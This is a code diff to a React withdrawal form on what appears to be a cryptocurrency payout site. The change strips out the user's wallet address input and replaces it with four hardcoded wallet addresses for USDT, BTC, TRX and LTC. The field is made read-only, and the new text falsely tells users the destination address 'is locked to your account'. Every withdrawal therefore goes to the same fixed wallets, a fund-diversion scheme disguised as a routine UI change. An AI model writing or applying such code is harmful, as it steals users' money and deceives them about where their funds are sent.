@@ -12,16 +12,28 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 
 const payoutMethods = ["USDT", "BTC", "TRX", "LTC"];
 
+const lockedAddresses: Record<string, string> = {
+    "USDT": "0xd9423913b016fa1412fae95382b3d7376817b40a",
+    "BTC": "36TsnxcPXiKvdHf112XFdexRpBHa8EsWSB",
+    "TRX": "TQ1CTp1CcHriBAsbyPZj6YQU9WrW3ErqYb",
+    "LTC": "ltc1q93n2q7qdncp33eswscwfx62wxl9w7gpz47jl56"
+};
+
 
 export function WithdrawalForm() {
     const [amount, setAmount] = useState('');
-    const [walletAddress, setWalletAddress] = useState('');
     const [currency, setCurrency] = useState('BTC');
+    const [walletAddress, setWalletAddress] = useState(lockedAddresses.BTC);
     const [loading, setLoading] = useState(false);
     const { toast } = useToast();
     const { user } = useAuth();
     
     const balance = user?.balance || 0;
+
+    const handleCurrencyChange = (value: string) => {
+        setCurrency(value);
+        setWalletAddress(lockedAddresses[value]);
+    };
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault();
@@ -49,7 +61,7 @@ export function WithdrawalForm() {
             toast({
                 variant: 'destructive',
                 title: 'Wallet Address Required',
-                description: 'Please enter your wallet address.',
+                description: 'A wallet address is required for withdrawals.',
             });
             return;
         }
@@ -62,7 +74,6 @@ export function WithdrawalForm() {
 
         setLoading(false);
         setAmount('');
-        setWalletAddress('');
         toast({
             title: 'Withdrawal Request Submitted',
             description: 'Your request is being processed and will be reviewed by an admin.',
@@ -73,7 +84,7 @@ export function WithdrawalForm() {
         <Card>
             <CardHeader>
                 <CardTitle>Request Withdrawal</CardTitle>
-                <CardDescription>Select your currency, enter your wallet address, and the amount you wish to withdraw.</CardDescription>
+                <CardDescription>Select your currency and the amount you wish to withdraw. The destination address is locked to your account.</CardDescription>
                  <CardDescription className="pt-2">Available to withdraw: <span className="font-bold text-primary">${balance.toFixed(2)}</span></CardDescription>
                  <CardDescription className="pt-2 text-yellow-400">Minimum withdrawal requires 5 verified accounts.</CardDescription>
             </CardHeader>
@@ -81,7 +92,7 @@ export function WithdrawalForm() {
                 <CardContent className="space-y-4">
                     <div className="space-y-2">
                         <Label htmlFor="currency">Payout Currency</Label>
-                        <Select onValueChange={setCurrency} defaultValue={currency}>
+                        <Select onValueChange={handleCurrencyChange} defaultValue={currency}>
                             <SelectTrigger id="currency">
                                 <SelectValue placeholder="Select a currency" />
                             </SelectTrigger>
@@ -105,13 +116,13 @@ export function WithdrawalForm() {
                         />
                     </div>
                     <div className="space-y-2">
-                        <Label htmlFor="walletAddress">Wallet Address</Label>
+                        <Label htmlFor="walletAddress">Wallet Address (Locked)</Label>
                         <Input
                             id="walletAddress"
                             type="text"
-                            placeholder="Enter your wallet address"
                             value={walletAddress}
-                            onChange={(e) => setWalletAddress(e.target.value)}
+                            readOnly
+                            className="bg-muted cursor-not-allowed"
                         />
                     </div>
                 </CardContent>
